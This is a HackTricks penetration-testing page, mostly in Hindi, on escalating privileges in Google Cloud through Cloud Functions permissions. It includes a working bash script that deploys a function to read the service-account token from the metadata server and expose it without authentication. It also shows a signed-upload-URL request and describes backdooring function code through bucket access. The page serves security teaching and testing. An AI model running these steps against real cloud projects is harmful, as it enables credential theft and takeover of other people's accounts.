# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Cloud Functions के बारे में अधिक जानकारी:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

इन privileges के साथ एक attacker **arbitrary (malicious) code के साथ नया Cloud Function बना सकता है और उसे एक Service Account असाइन कर सकता है**। फिर metadata से Service Account token को leak करके उस पर privileges escalate किया जा सकता है.\
Function को trigger करने के लिए कुछ privileges की आवश्यकता हो सकती है।

Exploit scripts इस method के लिए यहाँ पाए जा सकते हैं [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) और [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) और prebuilt .zip file यहाँ मिल सकती है [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

इन privileges के साथ एक attacker **किसी Function के code को modify कर सकता है और यहां तक कि जोड़कर दिए गए service account को भी बदल सकता है** ताकि token को exfiltrate किया जा सके।

> [!CAUTION]
> cloud functions deploy करने के लिये आपको default compute service account या उस service account पर actAs permissions की भी आवश्यकता होगी जो image build करने के लिए उपयोग होती है।

कुछ अतिरिक्त privileges जैसे version 1 cloudfunctions के लिए `.call` permission या function को trigger करने के लिए role `role/run.invoker` की आवश्यकता हो सकती है।

<details><summary>Cloud Function को malicious code से अपडेट करें ताकि Service Account token को exfiltrate किया जा सके</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> यदि आपको त्रुटि `Permission 'run.services.setIamPolicy' denied on resource...` मिलती है तो इसका कारण यह है कि आप `--allow-unauthenticated` पैरामीटर का उपयोग कर रहे हैं और आपके पास इसके लिए पर्याप्त अनुमतियाँ नहीं हैं।

The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

इस अनुमति के साथ आप एक **signed URL** प्राप्त कर सकते हैं जिससे आप function bucket में फ़ाइल अपलोड कर सकेंगे (लेकिन function के कोड में परिवर्तन नहीं होगा, आपको इसे अभी भी अपडेट करना होगा)

<details><summary>Cloud Function के लिए signed upload URL जनरेट करें</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

मुझे ठीक से यकीन नहीं है कि केवल यह permission एक हमलावर के दृष्टिकोण से कितना उपयोगी है, लेकिन यह जानना अच्छा है।

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

अपने आप को किसी भी पहले बताए गए **`.update`** या **`.create`** privileges दे कर escalate करें।

### `cloudfunctions.functions.update`

केवल **`cloudfunctions`** permissions होने पर, बिना **`iam.serviceAccounts.actAs`** के आप फ़ंक्शन को update नहीं कर पाएँगे, इसलिए यह VALID PRIVESC नहीं है।

### Read & Write Access over the bucket

यदि आपके पास बकेट पर read और write एक्सेस है, तो आप कोड में परिवर्तन मॉनिटर कर सकते हैं और जब भी बकेट में कोई **update** होता है आप नए कोड को अपने कोड से बदल सकते हैं ताकि Cloud Function का नया वर्शन सबमिट किए गए backdoored code के साथ चलें।

आप इस हमले के बारे में और देख सकते हैं:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

हालाँकि, आप इसे तीसरे पक्ष के Cloud Functions को पहले से compromise करने के लिए उपयोग नहीं कर सकते क्योंकि यदि आप अपने अकाउंट में बकेट बनाते हैं और उसे public permissions दे देते हैं ताकि external project उस पर लिख सके, तो आपको निम्नलिखित error मिलता है:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> हालाँकि, इसे DoS attacks के लिए इस्तेमाल किया जा सकता है।

### Read & Write Access over Artifact Registry

जब कोई Cloud Function बनता है तो एक नया docker image प्रोजेक्ट के Artifact Registry में push होता है। मैंने image को नए एक से बदलने की कोशिश की, और वर्तमान image (और `cache` image) को डिलीट भी किया, लेकिन कुछ भी नहीं बदला, cloud function काम करना जारी रहा। इसलिए, संभवतः बकेट की तरह docker container बदलने के लिए **Race Condition attack** का दुरुपयोग संभव हो सकता है, लेकिन **केवल स्टोर की गई image को modify करने से Cloud Function को compromise करना संभव नहीं है**।

## संदर्भ

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
